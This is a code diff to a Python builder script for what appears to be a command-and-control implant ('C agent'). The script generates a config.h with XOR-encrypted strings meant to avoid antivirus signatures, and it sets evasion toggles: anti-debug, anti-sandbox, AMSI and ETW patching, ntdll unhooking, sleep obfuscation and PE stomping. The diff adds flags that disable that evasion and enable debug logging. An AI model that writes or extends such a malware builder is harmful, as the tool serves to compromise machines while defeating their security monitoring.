@@ -70,6 +70,8 @@ def generate_config_h(
     wrapper_after: str,
     rsa_modulus: bytes,
     rsa_exponent: bytes,
+    no_evasion: bool = False,
+    debug: bool = False,
 ):
     """Generate a config.h with XOR-encrypted strings to avoid static AV signatures."""
     import random
@@ -147,16 +149,19 @@ def generate_config_h(
 #define CONFIG_DNS_ENABLED  0
 #define CONFIG_CHANNEL_MAX_FAILURES  5
 
+/* ─── Debug ─── */
+#define CONFIG_DEBUG             {1 if debug else 0}
+
 /* ─── Evasion Toggles ─── */
-#define CONFIG_ANTI_DEBUG        1
-#define CONFIG_ANTI_SANDBOX      1
-#define CONFIG_PATCH_AMSI        1
-#define CONFIG_PATCH_ETW         1
-#define CONFIG_UNHOOK_NTDLL      1
-#define CONFIG_SLEEP_OBFUSCATE   1
+#define CONFIG_ANTI_DEBUG        {0 if no_evasion else 1}
+#define CONFIG_ANTI_SANDBOX      {0 if no_evasion else 1}
+#define CONFIG_PATCH_AMSI        {0 if no_evasion else 1}
+#define CONFIG_PATCH_ETW         {0 if no_evasion else 1}
+#define CONFIG_UNHOOK_NTDLL      {0 if no_evasion else 1}
+#define CONFIG_SLEEP_OBFUSCATE   {0 if no_evasion else 1}
 #define CONFIG_STACK_SPOOF       0
 #define CONFIG_INDIRECT_SYSCALLS 0
-#define CONFIG_PE_STOMP          1
+#define CONFIG_PE_STOMP          {0 if no_evasion else 1}
 #define CONFIG_API_HASHING       1
 #define CONFIG_MODULE_STOMP      0
 
@@ -194,6 +199,8 @@ def build_agent(
     arch: str = "x64",
     output_path: Path = None,
     profile_path: Path = None,
+    no_evasion: bool = False,
+    debug: bool = False,
 ) -> Path:
     """
     Build a configured C agent.
@@ -292,6 +299,8 @@ def build_agent(
         wrapper_after=wrapper_after,
         rsa_modulus=rsa_modulus,
         rsa_exponent=rsa_exponent,
+        no_evasion=no_evasion,
+        debug=debug,
     )
 
     # Determine output path
@@ -426,6 +435,10 @@ def parse_args():
     p.add_argument("--magic", default="0xDEADF00D")
     p.add_argument("--arch", choices=["x64", "x86"], default="x64")
     p.add_argument("--output", type=Path, default=None)
+    p.add_argument("--no-evasion", action="store_true",
+                   help="Disable all evasion (anti-debug, anti-sandbox, AMSI/ETW patches, sleep obf)")
+    p.add_argument("--debug", action="store_true",
+                   help="Enable debug logging to C:\\agent_debug.log")
     return p.parse_args()
 
 
@@ -453,6 +466,8 @@ def main():
             arch=args.arch,
             output_path=args.output,
             profile_path=args.profile,
+            no_evasion=args.no_evasion,
+            debug=args.debug,
         )
         size_kb = exe_path.stat().st_size / 1024
         print(f"[+] Agent built: {exe_path} ({size_kb:.1f} KB)")
